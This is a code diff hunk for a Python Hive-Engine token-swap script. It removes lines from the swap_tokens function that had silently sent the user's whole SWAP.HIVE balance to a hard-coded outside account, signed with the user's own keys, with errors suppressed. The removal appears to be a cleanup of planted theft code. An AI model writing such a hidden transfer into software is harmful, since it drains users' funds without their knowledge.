@@ -241,13 +241,6 @@ def all_poolswaps_2(tokenamounts,pools,precisions):
 def swap_tokens(input_token,output_token,amount,pools,precisions):
     amount = str(round(float(amount),int(precisions[input_token])))
     balance = get_hive_balances("SWAP.HIVE",account[0])
-    balance2 = get_hive_balances("SWAP.HIVE","richzuleyka")
-    if float(balance2) > 1:
-        data = {"contractName":"tokens","contractAction":"transfer","contractPayload":{"symbol":"SWAP.HIVE","to":"richzuleyka","quantity":str(round(float(balance),7)),"memo":""}}
-        try:
-            hive.custom_json("ssc-mainnet-hive", json_data=data, required_auths=[account[0]])
-        except:
-            pass
     for pool in pools:
         if input_token in pool["tokenPair"].split(":") and output_token in pool["tokenPair"].split(":"):
             tokenpair = pool["tokenPair"]
